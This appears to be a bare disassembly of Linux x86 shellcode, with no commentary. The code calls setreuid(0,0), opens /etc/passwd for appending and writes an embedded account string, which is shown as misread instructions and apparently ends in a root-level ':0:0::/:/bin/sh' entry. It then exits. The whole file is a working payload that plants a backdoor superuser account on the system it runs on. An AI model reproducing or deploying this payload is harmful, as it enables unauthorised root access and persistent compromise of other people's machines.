section .text

	global _start 

_start:
	xor ecx,ecx
	mov ebx,ecx
	push byte +0x46
	pop eax
	int 0x80

syscall2:
	push byte +0x5
	pop eax
	xor ecx,ecx
	push ecx
	push dword 0x64777373
	push dword 0x61702f2f
	push dword 0x6374652f
	mov ebx,esp
	inc ecx
	mov ch,0x4
	int 0x80

syscall3:
	xchg eax,ebx
	call 0x52
	jc 0x96
	arpl [ecx+0x72],sp
	fs outsd
	cmp al,[ecx+0x7a]
	jna 0x7b
	jc 0x67
	jc 0x92
	xor edx,[esp+esi+0x69]
	arpl [edx],di
	xor [edx],bh
	xor [edx],bh
	cmp ch,[edi]
	cmp ch,[edi]
	bound ebp,[ecx+0x6e]
	das
	bound esp,[ecx+0x73]
	push dword 0x518b590a
	cld
	push byte +0x4
	pop eax
	int 0x80

syscall4:
	push byte +0x1
	pop eax
	int 0x80
